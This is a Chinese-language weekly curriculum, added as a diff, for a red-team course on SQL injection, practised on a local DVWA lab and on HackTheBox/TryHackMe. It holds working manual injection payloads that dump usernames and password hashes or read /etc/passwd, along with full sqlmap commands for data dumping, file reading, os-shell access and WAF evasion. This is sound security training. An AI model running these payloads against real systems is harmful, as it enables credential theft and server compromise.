@@ -1,0 +1,391 @@
+================================================================================
+第13周：SQL注入攻击 (Web深入期)
+================================================================================
+
+【本周围绕的核心渗透案例阶段】
+以"从手工SQL注入到自动化利用"为贯穿案例，学员在掌握SQL语言和数据库结构
+（第11周）的基础上，深入学习SQL注入漏洞的原理、手工注入技术、sqlmap自动化
+利用以及高级绕过技巧。通过DVWA靶场完成从Low到High难度的全关卡通关。
+本阶段属于"Web深入期"，SQL注入是OWASP Top 10中的经典高危漏洞。
+
+【本周学习目标】
+1. 理解SQL注入漏洞的成因：用户输入拼接SQL语句导致的代码注入
+2. 掌握SQL注入的分类：数字型、字符型、搜索型、盲注（布尔/时间）
+3. 掌握手工SQL注入流程：发现注入点 -> 判断类型 -> 确定列数 -> 获取数据
+4. 熟练使用UNION注入进行数据库信息枚举
+5. 掌握布尔盲注和时间盲注的原理和手工利用方法
+6. 掌握sqlmap的全功能使用：检测、枚举、数据提取、文件操作、系统命令执行
+7. 掌握sqlmap高级选项：tamper脚本绕过WAF、代理、cookie认证、二次注入
+8. 能独立完成DVWA SQL注入模块从Low到High的全关卡通关
+
+【本周知识清单】
+★ SQL注入原理与分类
+  - 注入产生原因：未过滤/未参数化的用户输入被拼接到SQL查询
+  - 注入类型：UNION注入、布尔盲注(Blind Boolean)、时间盲注(Blind Time)、
+    报错注入(Error-Based)、堆叠查询(Stacked Queries)、二次注入(Second-Order)
+  - 注入点位置：GET参数、POST参数、Cookie、HTTP Header、Referer
+  - 数字型注入 vs 字符型注入的判断方法（' , " , \ 测试）
+  - 注释符使用：--+、#、-- -（MySQL）、--（MSSQL/PostgreSQL）
+  - 宽字节注入（GBK编码绕过）
+
+★ 手工SQL注入技术
+  - ORDER BY / GROUP BY 确定列数
+  - UNION SELECT 联合查询注入
+  - information_schema枚举数据库名、表名、列名
+  - GROUP_CONCAT() 聚合函数拼接多行数据
+  - LOAD_FILE() 读取服务器文件 (MySQL)
+  - INTO OUTFILE / DUMPFILE 写入文件 (MySQL)
+  - 布尔盲注：substr(database(),1,1)、ascii()、length()函数组合
+  - 时间盲注：sleep()、benchmark()、if条件触发时间延迟
+  - 报错注入：extractvalue()、updatexml()、floor() + rand()报错回显
+
+★ sqlmap自动化注入
+  - sqlmap检测引擎：多级检测策略
+  - 基础参数：-u URL、--data POST数据、--cookie Cookie
+  - 枚举参数：--dbs、--tables、--columns、--dump
+  - 数据库类型检测：--dbms
+  - 技术选择：--technique (U=UNION, B=Boolean, T=Time, E=Error, S=Stacked)
+  - 文件操作：--file-read、--file-write、--file-dest
+  - 系统命令执行：--os-shell、--os-cmd、--os-pwn
+  - 权限提升：--priv-esc（Windows下尝试Meterpreter上传）
+
+★ sqlmap高级绕过
+  - --tamper：使用tamper脚本修改payload
+  - 常用tamper脚本：space2comment、between、charencode、randomcase
+  - --level、--risk：调整检测深度和风险等级
+  - --random-agent、--delay：躲避检测
+  - --proxy：使用代理中转请求（配合Burp Suite）
+  - 二次注入（Second Order SQLi）利用
+  - WAF绕过策略组合：编码 + 注释 + 空白字符替换
+
+【本周工具清单】
+  - sqlmap（自动化SQL注入工具）
+  - Burp Suite（HTTP代理和请求分析）
+  - DVWA（Damn Vulnerable Web Application靶场）
+  - MySQL/MariaDB（数据库环境）
+  - ArchStrike Linux
+
+================================================================================
+周一：SQL注入原理
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：SQL注入漏洞产生的根本原因、分类和基本检测方法
+  - SQL注入定义：攻击者通过构造恶意SQL语句插入到应用程序的数据库查询中
+  - 漏洞根源：字符串拼接构建SQL查询，未使用参数化查询/预编译语句
+  - 注入语法基础回顾：
+    * 单引号(')和双引号(")用于字符串界定
+    * -- 和 # 用于注释后续SQL代码
+    * UNION SELECT 用于合并查询结果
+    * OR 1=1 用于绕过条件验证
+  - 注入点检测方法：
+    * 单引号测试：' -> SQL语法错误 -> 存在注入
+    * 逻辑测试：' OR '1'='1 和 ' AND '1'='2 观察响应差异
+    * 时间测试：' AND sleep(5)-- - 观察响应时间
+  - 数字型注入：id=1 -> id=1 AND 1=1 和 id=1 AND 1=2
+  - 字符型注入：id='1' -> id='1' OR '1'='1
+  - 搜索型注入：keyword='test' -> keyword='test%' OR 1=1 -- -
+  参考文件：/home/a/成长为一个红队/网安基础知识/08-数据库基础.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：搭建DVWA环境，进行SQL注入基本检测和原理验证
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/04-SQL注入攻击.txt
+
+  操作步骤：
+    Step 1: sudo systemctl start apache2 && sudo systemctl start mysql 启动Web环境
+    Step 2: 浏览器访问 http://localhost/dvwa 或 http://192.168.56.101/dvwa
+    Step 3: 登录DVWA (用户名: admin, 密码: password)
+    Step 4: 左侧菜单 DVWA Security -> 设置安全级别为 "Low"
+    Step 5: 左侧菜单 SQL Injection 进入SQL注入练习页面
+    Step 6: 在User ID输入框中输入 1 并提交，观察正常返回结果
+    Step 7: 输入 1' 并提交，观察SQL语法错误信息（确认注入点存在）
+    Step 8: 输入 1' OR '1'='1 并提交，观察是否能返回所有用户数据
+    Step 9: 输入 1' AND '1'='2 并提交，观察返回结果的变化
+    Step 10: 输入 1' OR 1=1-- - 并提交，使用注释符号闭合查询
+    Step 11: 输入 1' order by 1-- -、1' order by 2-- -、1' order by 3-- - 确定列数
+    Step 12: 输入 1' union select 1,2-- - 测试联合查询（根据上一步确定的列数调整）
+    Step 13: 输入 1' union select user(),database()-- - 获取当前用户和数据库名
+    Step 14: 将DVWA安全级别切换为"Medium"和"High"，重复以上测试
+    Step 15: 使用Burp Suite代理捕获请求，分析SQL注入的HTTP请求特征
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周二：手工SQL注入练习
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：系统化手工SQL注入流程和深度数据提取技术
+  - 标准手工注入六步法：
+    1. 发现注入点（单引号、逻辑、时间测试）
+    2. 判断注入类型（数字型/字符型/搜索型）
+    3. 确定列数（ORDER BY 递增法 / UNION SELECT NULL法）
+    4. 确定回显位置（UNION SELECT 1,2,3...,N 观察哪些数字回显）
+    5. 获取数据库信息（database()、version()、user()）
+    6. 提取数据（枚举库 -> 枚举表 -> 枚举列 -> 导出数据）
+  - 数据提取SQL语句模板：
+    * 获取所有数据库：SELECT schema_name FROM information_schema.schemata
+    * 获取当前库所有表：SELECT table_name FROM information_schema.tables WHERE table_schema=database()
+    * 获取某表所有列：SELECT column_name FROM information_schema.columns WHERE table_name='xxx'
+    * 提取数据：SELECT concat(column1,':',column2) FROM tablename
+  - 多行合并：GROUP_CONCAT() vs LIMIT逐行获取
+  - 十六进制编码绕过：0x68656C6C6F 替代 'hello'
+  - char()函数编码绕过：char(104,101,108,108,111)
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/04-SQL注入攻击.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：在DVWA Low/Medium级别上完成完整的手工SQL注入数据提取
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/04-SQL注入攻击.txt
+
+  操作步骤：
+    Step 1: DVWA安全级别设为Low，进入SQL Injection页面
+    Step 2: 完整手工注入流程(使用Burp Suite发送请求便于读写):
+      - 1' order by 2-- - (测试2列是否可行)
+      - 1' order by 3-- - (测试3列是否报错,确定列数为2)
+      - 1' and 1=2 union select 1,2-- - (发现回显位置在1和2)
+    Step 3: 1' and 1=2 union select database(),version()-- - 获取数据库名和版本
+    Step 4: 1' and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()-- - 枚举所有表名
+    Step 5: 1' and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name='users'-- - 枚举users表的列名
+    Step 6: 1' and 1=2 union select user,password from users-- - 提取users表的user和password字段
+    Step 7: 将DVWA安全级别切换为Medium，重复手工注入
+    Step 8: Medium级别使用POST请求，通过Burp Suite修改body中的id参数: 1 union select user,password from users
+    Step 9: 将DVWA安全级别切换为High，分析High级别的防御机制
+    Step 10: High级别在新页面打开，URL中加入&id=参数，尝试注入
+    Step 11: 练习布尔盲注（在Low级别下）:
+      - 1' and length(database())=4-- - (测试数据库名长度)
+      - 1' and ascii(substr(database(),1,1))>97-- - (逐字符猜测数据库名)
+    Step 12: 练习时间盲注:
+      - 1' and if(length(database())=4,sleep(5),1)-- - (通过响应时间判断)
+    Step 13: 记录完整的注入payload，整理为手工注入笔记
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周三：sqlmap自动化注入
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：sqlmap架构、检测引擎和核心功能参数
+  - sqlmap概述：开源自动化SQL注入检测和利用工具
+  - 检测流程：
+    1. 发送正常请求获取baseline
+    2. 发送恶意payload检测注入（所有technique逐一尝试）
+    3. 确认注入类型和DBMS
+    4. 根据注入类型选择最优提取策略
+  - 核心参数清单：
+    * -u：目标URL（需包含参数）
+    * --data：POST请求数据
+    * --cookie：认证Cookie
+    * -p：指定注入参数
+    * --dbs：枚举所有数据库
+    * --tables：枚举所有表
+    * --columns：枚举所有列
+    * --dump：导出数据
+    * -D：指定数据库名
+    * -T：指定表名
+    * -C：指定列名
+    * --batch：使用默认选项（自动化）
+    * --technique：指定注入技术
+    * --dbms：指定数据库类型
+  - 枚举快捷参数：
+    * --current-db：当前数据库
+    * --current-user：当前用户
+    * --is-dba：是否DBA权限
+    * --users：所有数据库用户
+    * --passwords：用户密码哈希
+    * --privileges：用户权限
+  - 输出文件位置：~/.local/share/sqlmap/output/
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/04-SQL注入攻击.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：使用sqlmap对DVWA进行全功能自动化SQL注入
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/04-SQL注入攻击.txt
+
+  操作步骤：
+    Step 1: sqlmap -h 查看帮助信息（关注常用参数）
+    Step 2: sqlmap -hh 查看完整帮助（了解高级参数）
+    Step 3: DVWA安全级别设为Low，获取Cookie（浏览器F12 -> Application -> Cookies）
+    Step 4: sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" --batch 基础检测
+    Step 5: sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" --dbs 枚举所有数据库
+    Step 6: sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" --current-db 获取当前数据库
+    Step 7: sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" -D dvwa --tables 枚举dvwa库的所有表
+    Step 8: sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" -D dvwa -T users --columns 枚举users表列
+    Step 9: sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" -D dvwa -T users --dump 导出users表所有数据
+    Step 10: sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" --users --passwords 枚举所有用户和密码哈希
+    Step 11: sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" --technique=U 指定只使用UNION注入技术
+    Step 12: sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" --technique=B 指定只使用布尔盲注技术
+    Step 13: sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" --technique=T 指定只使用时间盲注技术
+    Step 14: sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" --level=3 --risk=2 提高检测深度
+    Step 15: 对Medium级别进行POST请求注入: sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/" --data="id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=medium"
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周四：sqlmap高级选项（tamper, os-shell）
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：sqlmap高级利用技术——tamper脚本绕过、文件操作、系统命令执行
+  - Tamper脚本体系：
+    * 存放路径：/usr/share/sqlmap/tamper/
+    * 常用tamper脚本分类：
+      - 空格绕过类：space2comment.py、space2hash.py、space2plus.py
+      - 编码绕过类：charencode.py、chardoubleencode.py、charunicodeencode.py
+      - 大小写绕过类：randomcase.py、uppercase.py
+      - 关键字绕过类：between.py、equaltolike.py、ifnull2ifisnull.py
+      - 混杂绕过类：apostrophemask.py、base64encode.py、commalesslimit.py
+    * 多个tamper组合使用：--tamper=tamper1,tamper2,tamper3
+  - 文件操作（需要DBA权限）：
+    * --file-read：从数据库服务器读取文件（如/etc/passwd）
+    * --file-write --file-dest：向服务器写入文件
+    * 典型场景：读取Web配置文件、写入WebShell
+  - 系统命令执行：
+    * --os-shell：获取操作系统交互式Shell（需满足条件）
+    * --os-cmd：执行单条系统命令
+    * --os-pwn：OOB(out-of-band)通道建立（Meterpreter或VNC）
+    * 前提条件：数据库DBA权限 + 数据库可写入文件 + Web路径已知
+  - 高级选项：
+    * --random-agent：随机User-Agent
+    * --delay=N：请求间隔延迟N秒
+    * --timeout=N：请求超时设置
+    * --proxy：使用HTTP/HTTPS代理
+    * --force-ssl：强制使用SSL/TLS
+  - --sqlmap-shell：进入sqlmap交互式Shell模式
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/04-SQL注入攻击.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：sqlmap tamper脚本测试、文件读写、os-shell获取
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/04-SQL注入攻击.txt
+
+  操作步骤：
+    Step 1: ls /usr/share/sqlmap/tamper/ 列出所有可用tamper脚本
+    Step 2: sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" --tamper=space2comment --batch 测试space2comment tamper
+    Step 3: sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" --tamper=between,randomcase,space2comment --batch 组合使用多种tamper
+    Step 4: sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" --random-agent --delay=2 --batch 使用随机UA和延迟
+    Step 5: sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" --proxy=http://127.0.0.1:8080 通过Burp代理中转请求
+    Step 6: Burp Suite中查看sqlmap的请求流，分析tamper脚本的效果
+    Step 7: sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" --file-read=/etc/passwd 尝试读取服务器文件
+    Step 8: sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" --is-dba 检查当前数据库用户是否为DBA
+    Step 9: sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" --privileges 查看当前用户权限
+    Step 10: sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" --os-shell 尝试获取操作系统Shell（需DBA权限）
+    Step 11: 如获取os-shell成功: whoami; id; ls -la; cat /etc/hostname
+    Step 12: sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" --sqlmap-shell 进入sqlmap交互Shell
+    Step 13: 在sqlmap-shell中尝试执行多个命令，观察状态保持
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周五：DVWA SQL注入全关卡通关
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：DVWA SQL注入模块各安全级别的源码分析和防护机制对比
+  - DVWA SQL注入源码层级分析：
+    * Low级：完全无过滤，直接拼接SQL语句
+    * Medium级：使用mysqli_real_escape_string()转义特殊字符
+    * High级：使用LIMIT限制和session保护，但仍有绕过可能
+    * Impossible级：使用PDO参数化查询（真正安全）
+  - Low级攻击策略：任意UNION注入、报错注入、盲注都可用
+  - Medium级绕过策略：
+    * 前端下拉框 -> 使用Burp修改POST数据
+    * mysql_real_escape_string绕过：不依赖引号的注入方法
+  - High级绕过策略：
+    * 限制返回行数为1 -> 使用LIMIT和OFFSET绕过
+    * 分离查询页面 -> 直接在弹出页面的URL参数中注入
+  - 防护最佳实践：预编译语句(Prepared Statement)、输入验证(白名单)、最小权限原则
+  - SQLi到RCE的完整攻击链：注入发现 -> 读文件 -> 写WebShell -> 命令执行
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：完整通关DVWA SQL注入Low/Medium/High三关
+  操作步骤：
+    Step 1: DVWA安全级别设为Low
+    Step 2: 使用Burp Suite代理，完整执行Low级SQL注入攻击:
+      - 1' order by 2-- -
+      - 1' union select user,password from users-- -
+      - 成功获取所有用户名和密码哈希
+    Step 3: 记录Low级通关截图和完整步骤
+    Step 4: DVWA安全级别切换为Medium
+    Step 5: 使用Burp Suite拦截POST请求，修改id参数:
+      - id=1 order by 2-- - (Medium不需要单引号)
+      - id=1 union select user,password from users-- -
+    Step 6: 尝试不用引号的注入: id=1 union select 1,load_file('/etc/passwd')
+    Step 7: 记录Medium级通关截图和完整步骤
+    Step 8: DVWA安全级别切换为High
+    Step 9: 在弹出窗口的URL中: /vulnerabilities/sqli/?id=1' order by 2-- -&Submit=Submit#
+    Step 10: 使用LIMIT绕过: 1' and 1=2 union select user,password from users limit 1 offset 2-- -
+    Step 11: 记录High级通关截图和完整步骤
+    Step 12: 综合对比sqlmap和手工注入在三个级别的表现差异
+    Step 13: sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" -D dvwa -T users --dump 验证sqlmap自动化结果
+    Step 14: 整理本周SQL注入技术总结笔记
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周六：复习日 (2h 复习 + 1h HTB/THM)
+================================================================================
+
+📝 第1小时 | 周知识点回顾 (08:00 - 09:00)
+  复习清单：
+  - 手工SQL注入六步法默写：发现注入点 -> 判断类型 -> 确定列数 -> 回显位置 -> 数据库信息 -> 数据提取
+  - 注入分类回顾：数字型/字符型/搜索型，UNION/Boolean/Time/Error/Stacked
+  - sqlmap核心参数回忆：-u, --data, --cookie, --dbs, --tables, --columns, --dump
+  - 常用tamper脚本记忆：space2comment, between, randomcase, charencode
+
+💻 第2小时 | 注入技术综合练习 (09:00 - 10:00)
+  练习内容：不参考笔记，在DVWA三个安全级别上各完成一次SQL注入
+  操作步骤：
+    Step 1: Low级使用sqlmap自动化完成
+    Step 2: Medium级使用Burp + 手工注入完成
+    Step 3: High级使用手工盲注完成（限时30分钟）
+
+🔓 第3小时 | HackTheBox / TryHackMe Web挑战 (10:00 - 11:00)
+  练习内容：在HTB或THM平台上寻找包含SQL注入的Web挑战靶机
+  操作步骤：
+    Step 1: 连接HTB VPN或访问THM平台
+    Step 2: 搜索包含SQL注入的靶机（如HTB的"Academy"、"Unbalanced"等）
+    Step 3: 手工检测SQL注入点
+    Step 4: 使用sqlmap辅助数据提取
+    Step 5: 获取flag后记录完整的SQL注入利用过程
+    Step 6: 对比手册注入和自动化注入的效率和准确性
+
+================================================================================
+周日：休息日
+================================================================================
+
+【本周资源清单】
+理论知识文件：
+  /home/a/成长为一个红队/网安基础知识/08-数据库基础.txt
+  /home/a/成长为一个红队/archstrike-web教学/04-SQL注入攻击.txt
+
+实践教程文件：
+  /home/a/成长为一个红队/archstrike-web教学/04-SQL注入攻击.txt
+
+在线练习：
+  - DVWA (http://localhost/dvwa)
+  - HackTheBox Web挑战 (https://app.hackthebox.com)
+  - TryHackMe SQL注入房间 (https://tryhackme.com)
+  - PortSwigger Web Security Academy - SQL Injection (https://portswigger.net/web-security/sql-injection)
+
+推荐工具安装：
+  - sqlmap (sudo apt install sqlmap 或 git clone https://github.com/sqlmapproject/sqlmap)
+  - Burp Suite Community Edition (sudo apt install burpsuite)
+  - DVWA (git clone https://github.com/digininja/DVWA)
+
+【本周完成检查】
+[ ] 周一 [ ] 周二 [ ] 周三 [ ] 周四 [ ] 周五
+[ ] 周六复习 [ ] 笔记 [ ] 体能
